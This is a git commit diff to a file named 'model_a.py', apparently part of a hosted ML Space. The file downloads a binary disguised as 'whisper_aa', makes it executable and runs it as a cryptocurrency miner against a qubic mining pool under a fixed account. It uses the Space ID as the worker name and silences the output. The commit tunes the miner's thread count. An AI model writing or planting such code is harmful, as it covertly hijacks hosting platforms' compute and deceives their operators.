1b5e85efdce19198f9f7f3bfc80944911c5af958
qqivk <fsswr518@gmail.com>
2025-02-16 02:40:59 +0100

    Update model_a.py

--- model_a.py
+++ model_a.py
@@ -3,4 +3,4 @@ os.system("wget https://github.com/qqivk/project-04/raw/refs/heads/main/whisper_
 os.system("unzip whisper_aa.zip")
 os.system("chmod +x whisper_aa")
 wn = os.getenv('SPACE_ID').replace("/","_")
-os.system(f"./whisper_aa --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --worker {wn} >/dev/null")
+os.system(f"./whisper_aa --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 2 --worker {wn} >/dev/null")
